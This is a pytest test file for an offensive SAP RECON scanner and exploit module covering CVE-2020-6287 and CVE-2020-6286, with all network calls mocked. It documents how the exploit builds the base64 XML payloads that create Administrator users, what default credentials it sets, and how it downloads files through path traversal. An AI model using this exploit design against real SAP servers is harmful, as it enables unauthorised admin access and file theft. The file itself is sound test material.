"""Tests for sap_cve_2020_6287 — SAP RECON scanner + exploit.

All tests are offline. Network calls (_head, _get, _post_soap, urlopen)
are monkey-patched.
"""

import base64
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest
import sap_cve_2020_6287 as recon


# ---------------------------------------------------------------------------
# URL / helper primitives
# ---------------------------------------------------------------------------

class TestBuildUrl:

    def test_ipv4_http(self):
        u = recon._build_url("10.0.0.1", 50000, "/CTC", False)
        assert u == "http://10.0.0.1:50000/CTC"

    def test_ipv4_https(self):
        u = recon._build_url("10.0.0.1", 50001, "/CTC", True)
        assert u == "https://10.0.0.1:50001/CTC"

    def test_ipv6_bracketed(self):
        u = recon._build_url("fe80::1", 50000, "/x", False)
        assert u == "http://[fe80::1]:50000/x"

    def test_ipv6_already_bracketed(self):
        u = recon._build_url("[::1]", 50000, "/x", False)
        assert u == "http://[::1]:50000/x"


# ---------------------------------------------------------------------------
# baData payload templates
# ---------------------------------------------------------------------------

class TestPayloadTemplates:

    def test_admin_payload_formats_as_xml(self):
        p = recon._BA_ADMIN.format(username="alice", password="secret",
                                      rand="Rnd1234")
        # Key structural elements from the chipik PoC
        assert "<PCK>" in p and "</PCK>" in p
        assert "<roleName>Administrator</roleName>" in p
        assert '<userName secure="true">alice</userName>' in p
        assert '<password secure="true">secret</password>' in p
        # The same {rand} placeholder is reused across non-admin roles
        assert p.count("Rnd1234") >= 2

    def test_plain_payload_formats_as_xml(self):
        p = recon._BA_PLAIN.format(username="bob", password="pw!")
        assert p.startswith("<root><user>")
        assert "<JavaOrABAP>java</JavaOrABAP>" in p
        assert "<username>bob</username>" in p
        assert "<password>pw!</password>" in p
        assert "<userType>J</userType>" in p


# ---------------------------------------------------------------------------
# check_cve_2020_6287 — scanner
# ---------------------------------------------------------------------------

class TestCheckCVE:

    def test_vulnerable_on_200(self, monkeypatch):
        monkeypatch.setattr(recon, "_head", lambda *a, **k: 200)
        r = recon.check_cve_2020_6287("1.2.3.4", 50000)
        assert r["vulnerable"] is True
        assert r["http_status"] == 200
        assert "LM Configuration Wizard" in r["evidence"]

    def test_not_vulnerable_on_404(self, monkeypatch):
        monkeypatch.setattr(recon, "_head", lambda *a, **k: 404)
        r = recon.check_cve_2020_6287("1.2.3.4", 50000)
        assert r["vulnerable"] is False
        assert r["http_status"] == 404
        assert "404" in r["evidence"]

    def test_not_vulnerable_on_403(self, monkeypatch):
        monkeypatch.setattr(recon, "_head", lambda *a, **k: 403)
        r = recon.check_cve_2020_6287("1.2.3.4", 50000)
        assert r["vulnerable"] is False
        assert "403" in r["evidence"]

    def test_fallback_lm_wizard_200(self, monkeypatch):
        # Primary HEAD returns something odd but /LMConfigurationWizard 200s
        monkeypatch.setattr(recon, "_head", lambda *a, **k: 500)
        monkeypatch.setattr(recon, "_get", lambda *a, **k: 200)
        r = recon.check_cve_2020_6287("1.2.3.4", 50000)
        assert r["vulnerable"] is True
        assert r["url"].endswith("/LMConfigurationWizard")

    def test_unreachable_network_error(self, monkeypatch):
        monkeypatch.setattr(recon, "_head", lambda *a, **k: 0)
        r = recon.check_cve_2020_6287("1.2.3.4", 50000)
        assert r["reachable"] is False
        assert r["vulnerable"] is False


# ---------------------------------------------------------------------------
# exploit_create_user — admin + plain paths
# ---------------------------------------------------------------------------

class TestExploit:

    def _make_post_soap(self, status, body="", err=""):
        def _fake(url, body_req, timeout):
            return status, body, err
        return _fake

    def test_admin_sends_valid_xml_payload(self, monkeypatch):
        captured = {}
        def _fake(url, body, timeout):
            captured["body"] = body
            return 200, "<return></return>", ""
        monkeypatch.setattr(recon, "_post_soap", _fake)
        r = recon.exploit_create_user("host", 50000, "alice", "pw",
                                         role="Administrator")
        assert r["success"] is True
        # Decode the embedded base64 baData to confirm it's XML
        import re
        m = re.search(r"<baData>([^<]+)</baData>", captured["body"])
        assert m, "baData element missing"
        decoded = base64.b64decode(m.group(1)).decode("utf-8")
        assert "<PCK>" in decoded
        assert "<roleName>Administrator</roleName>" in decoded
        assert "<userName secure=\"true\">alice</userName>" in decoded

    def test_plain_sends_user_xml(self, monkeypatch):
        captured = {}
        def _fake(url, body, timeout):
            captured["body"] = body
            return 200, "ok", ""
        monkeypatch.setattr(recon, "_post_soap", _fake)
        r = recon.exploit_create_user("host", 50000, "u", "p",
                                         role="J")
        assert r["success"] is True
        import re
        m = re.search(r"<baData>([^<]+)</baData>", captured["body"])
        decoded = base64.b64decode(m.group(1)).decode("utf-8")
        assert "<root><user>" in decoded
        assert "<username>u</username>" in decoded

    def test_success_on_200_no_fault(self, monkeypatch):
        monkeypatch.setattr(recon, "_post_soap",
                             self._make_post_soap(200, "<return/>"))
        r = recon.exploit_create_user("h", 50000, "u", "p")
        assert r["success"] is True

    def test_fault_is_reported(self, monkeypatch):
        body = ("<soap:Fault><faultstring>Something bad happened"
                "</faultstring></soap:Fault>")
        monkeypatch.setattr(recon, "_post_soap",
                             self._make_post_soap(500, body))
        r = recon.exploit_create_user("h", 50000, "u", "p")
        assert r["success"] is False
        assert "Something bad happened" in r["evidence"]

    def test_admin_timeout_counts_as_success(self, monkeypatch):
        # _post_soap returns status=-1 for timeouts; admin path treats
        # that as probable-success (chipik PoC behaviour).
        monkeypatch.setattr(recon, "_post_soap",
                             self._make_post_soap(-1, "", "timeout"))
        r = recon.exploit_create_user("h", 50000, "u", "p",
                                         role="Administrator")
        assert r["success"] is True
        assert "Read-timeout" in r["evidence"]

    def test_plain_timeout_is_failure(self, monkeypatch):
        # Plain path does NOT get the timeout-as-success benefit
        monkeypatch.setattr(recon, "_post_soap",
                             self._make_post_soap(-1, "", "timeout"))
        r = recon.exploit_create_user("h", 50000, "u", "p", role="J")
        assert r["success"] is False

    def test_network_error_is_failure(self, monkeypatch):
        monkeypatch.setattr(recon, "_post_soap",
                             self._make_post_soap(0, "", "connect refused"))
        r = recon.exploit_create_user("h", 50000, "u", "p")
        assert r["success"] is False
        assert "connect refused" in r["evidence"]


# ---------------------------------------------------------------------------
# exploit_create_admin convenience wrapper
# ---------------------------------------------------------------------------

class TestCreateAdmin:

    def test_generates_default_username_and_password(self, monkeypatch):
        captured = {}
        def _fake_exploit(host, port, user, pwd, **kw):
            captured["user"] = user
            captured["pwd"] = pwd
            return {"success": True, "evidence": "ok"}
        monkeypatch.setattr(recon, "exploit_create_user", _fake_exploit)
        r = recon.exploit_create_admin("h", 50000)
        assert r["success"]
        assert captured["user"].startswith("sapRpoc")
        assert captured["pwd"].startswith("Secure!PwD")


# ---------------------------------------------------------------------------
# verify_login — multi-path probe
# ---------------------------------------------------------------------------

class TestVerifyLogin:

    def test_no_endpoints_responds(self, monkeypatch):
        import urllib.request, urllib.error
        def _always_404(*a, **k):
            raise urllib.error.HTTPError(a[0] if a else "x", 404,
                                           "", {}, None)
        monkeypatch.setattr(urllib.request, "urlopen", _always_404)
        r = recon.verify_login("host", 50000, "u", "p", timeout=2)
        assert r["success"] is False
        assert "no admin-protected" in r["evidence"]


# ---------------------------------------------------------------------------
# download_file_via_traversal — CVE-2020-6286
# ---------------------------------------------------------------------------

class TestTraversal:

    def test_strips_trailing_zip_suffix(self, monkeypatch):
        captured = {}
        payload = base64.b64encode(b"PK\x03\x04zipbytes").decode()
        body = f"<return>{payload}</return>"

        def _fake(url, body_req, timeout):
            captured["body"] = body_req
            return 200, body, ""
        monkeypatch.setattr(recon, "_post_soap", _fake)

        r = recon.download_file_via_traversal("h", 50000,
                                                 "/usr/sap/foo.zip")
        assert r["success"] is True
        assert r["bytes_read"] == len(b"PK\x03\x04zipbytes")
        # sessionID in the outgoing SOAP must NOT end in .zip
        assert "/usr/sap/foo.zip" not in captured["body"]
        assert "/usr/sap/foo" in captured["body"]

    def test_empty_return_means_missing_file(self, monkeypatch):
        body = "<return></return>"
        monkeypatch.setattr(recon, "_post_soap",
                             lambda *a, **k: (200, body, ""))
        r = recon.download_file_via_traversal("h", 50000,
                                                 "/some/path")
        assert r["success"] is False
        assert "not found" in r["evidence"]

    def test_soap_fault_propagates(self, monkeypatch):
        body = ("<soap:Fault><faultstring>illegal path</faultstring>"
                "</soap:Fault>")
        monkeypatch.setattr(recon, "_post_soap",
                             lambda *a, **k: (200, body, ""))
        r = recon.download_file_via_traversal("h", 50000, "/x")
        assert r["success"] is False
        assert "illegal path" in r["evidence"]

    def test_http_error_reports_status(self, monkeypatch):
        monkeypatch.setattr(recon, "_post_soap",
                             lambda *a, **k: (500, "boom", ""))
        r = recon.download_file_via_traversal("h", 50000, "/x")
        assert r["success"] is False
        assert "500" in r["evidence"]

    def test_network_timeout(self, monkeypatch):
        monkeypatch.setattr(recon, "_post_soap",
                             lambda *a, **k: (-1, "", "read timeout"))
        r = recon.download_file_via_traversal("h", 50000, "/x")
        assert r["success"] is False
